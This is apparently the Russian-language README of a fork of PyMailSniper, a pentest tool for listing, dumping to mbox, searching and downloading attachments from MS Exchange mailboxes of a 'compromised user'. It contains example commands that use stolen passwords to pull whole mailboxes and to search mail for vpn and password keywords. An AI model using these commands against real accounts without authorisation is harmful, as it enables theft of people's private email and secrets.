# Инфо

За основу взят проект от foofus-sph1nx - https://github.com/foofus-sph1nx/PyMailSniper

**TOOL IS UNDER DEVELOPMENT**

**A LOT OF BUGS MAY APPEAR**

**ONLY FOLDER LISTING AND DUMPING IS STABLE RIGHT NOW**
# Что и зачем

Во время пентестов, компрометируя пользователя, никогда не будет лишним изучить его почту, 
но сделать это не всегда просто - трудности возникают при отсутствие GUI, пробрасывании портов и т.п.
Этот форк призван облегчить жизнь пентестерам и прочим личностям, максимально упростив исследование почтовых ящиков на основе MS Exchange.

Создается на основе Exchangelib - (https://github.com/ecederstrand/exchangelib)


PS:
Я не про кодер, пишу в первую очередь для себя, исправления и пожелания приветствуются)

# В чем отличия от оригинала
1) Выкачивание папок и писем в файлы формата mbox
2) Нормальный листинг папок
3) Многопоточность
4) tqdm


# Usage

1. Main Help
   
   ```bash
   python3 pymailsniper.py -h
   
   usage: python3 pymailsniper.py module [options]

   optional arguments:
     -h, --help            show this help message and exit

   Modules:
     available modules

     {folders,attachment,delegation,emails}
       folders             List Mailbox Folders
       attachment          List/Download Attachments
       delegation          Find where compromised user has access
       emails              Search for Emails

   ```

2. folders module help (Просмотр Папок)
   ```bash
   usage: python3 pymailsniper.py module [options] folders [-h] [-s SERVER]
                                                        [-e EMAIL]
                                                        [-p PASSWORD] [-a]
                                                        [-c]

   optional arguments:
     -h, --help            show this help message and exit
     -s SERVER, --remote-server SERVER
                           EWS URL for Mail Server
     -e EMAIL, --email EMAIL
                           Email address of compromised user
     -p PASSWORD, --password PASSWORD
                           Password of compromised user
     -a, --absolute        Print folders absolute paths instead tree if arg is present
     -c, --count           Print count of child folders and email if present
     -r, --root            Use "root" folder as root for printing insted of "Top Information Store"

   ```
   Вывести список папок в виде дерева - 
    ```bash
    python3 pymailsniper.py folders -s outlook.office365.com -e xyz@domain.com -p Password1
    ```
   Вывести список папок в виде дерева с указанием кол-ва дочерних папок и писем - 
    ```bash
    python3 pymailsniper.py folders -c -s outlook.office365.com -e xyz@domain.com -p Password1
    ```
   Вывести список папок (абсолютные пути) - 
    ```bash
    python3 pymailsniper.py folders -a -s outlook.office365.com -e xyz@domain.com -p Password1
    ```
   Вывести список папок (абсолютные пути) с указанием кол-ва дочерних папок и писем - 
    ```bash
    python3 pymailsniper.py folders -a -c -s outlook.office365.com -e xyz@domain.com -p Password1
    ```

3. Dump module help (Скачиваем папки с письмами в mbox файлы)

   ```bash
   usage: python3 pymailsniper.py module [options] dump [-h] [-s SERVER]
                                                     [-e EMAIL] [-p PASSWORD]
                                                     [-d DUMP_FOLDER]
                                                     folder

   positional arguments:
     folder                Folder to dump

   optional arguments:
     -h, --help            show this help message and exit
     -s SERVER, --remote-server SERVER
                           EWS URL for Mail Server
     -e EMAIL, --email EMAIL
                           Email address of compromised user
     -p PASSWORD, --password PASSWORD
                           Password of compromised user
     -d DUMP_FOLDER, --dump-folder DUMP_FOLDER
                           Local folder to store .mbox dumps
   ```

   Скачать вообще все в папку dump(очень долго, не советую, посмотрю в сторону многопоточности) - 
    ```bash
    python3 pymailsniper.py dump all -d ./dump -s outlook.office365.com -e xyz@domain.com -p Password1
    ```
    Скачать папку "secrets" в папку "qweqwe" - 
    ```bash
    python3 pymailsniper.py dump secrets -d ./qweqwe -s outlook.office365.com -e xyz@domain.com -p Password1
    ```

3. Exfiltrate emails (Еще не смотрел)

   ```bash
    python3 pymailsniper.py emails -s outlook.office365.com -e xyz@domain.com -p Password1 -t vpn,remote,password --field subject -c 100 -o emails.txt
   ```

4. List and/or Download attachments (Еще не смотрел)

   ```bash
    python3 pymailsniper.py attachment -s outlook.office365.com -e xyz@domain.com -p Password1 -t vpn,remote,password --field subject -c 100 -d l00t
   ```

5. Check if compromised account has delegated rights to any other inboxes (Еще не смотрел)

   ```bash
    python3 pymailsniper.py attachment -s outlook.office365.com -e xyz@domain.com -p Password1 -g list-of-emails.txt
   ```

